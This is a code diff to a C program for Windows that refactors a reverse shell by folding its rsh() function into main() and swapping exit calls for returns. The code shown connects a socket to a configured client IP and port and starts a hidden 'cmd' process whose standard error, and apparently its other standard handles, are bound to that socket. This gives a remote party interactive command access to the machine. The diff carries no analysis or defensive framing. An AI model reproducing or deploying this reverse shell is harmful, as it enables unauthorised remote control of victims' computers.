@@ -16,16 +16,16 @@
 #endif
 /* ================================================== */
 
-void rsh(void) {
+int main(void) {
 	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
 		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
-		exit(1);
+		return (1);
 	}
 
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
-		write(2, "[ERROR] WSASturtup failed.\n", 28);
-		exit(1);
+		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		return (1);
 	}
 
 	int port = CLIENT_PORT;
@@ -42,7 +42,7 @@ void rsh(void) {
 #else
 	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
 		write(2, "[ERROR] connect failed.\n", 24);
-		exit(1);
+		return (1);
 	}
 #endif
 
@@ -55,9 +55,6 @@ void rsh(void) {
 	sinfo.hStdError = (HANDLE)sockt;
 	PROCESS_INFORMATION pinfo;
 	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-}
 
-int main(void) {
-	rsh();
 	return (0);
 }
